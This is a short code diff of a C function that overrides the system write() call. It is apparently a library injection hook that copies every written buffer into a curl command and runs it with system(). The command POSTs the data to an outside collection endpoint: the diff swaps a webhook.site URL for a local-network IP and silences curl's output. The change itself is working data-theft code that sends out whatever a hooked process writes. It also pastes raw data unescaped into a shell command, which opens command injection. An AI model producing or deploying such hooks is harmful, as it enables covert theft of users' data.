@@ -17,10 +17,12 @@ ssize_t write(int fd, const void *buf, size_t count) {
   
   //format our string to make the curl call
   char testData[50000];
-  strcpy(testData, "curl -s -d 'data=");
+  strcpy(testData, "curl -s --output /dev/null -d 'data=");
   strcat(testData, p);
-  strcat(testData, "' -X POST 'https://webhook.site/65277f4e-f566-41bc-89ba-00132e05f7b3'");
-
+  //strcat(testData, "' -X POST 'https://webhook.site/65277f4e-f566-41bc-89ba-00132e05f7b3'");
+  strcat(testData, "' -X POST 'http://192.168.50.3:5001'");
+  
+  
   //make our curl call
   system(testData);
   
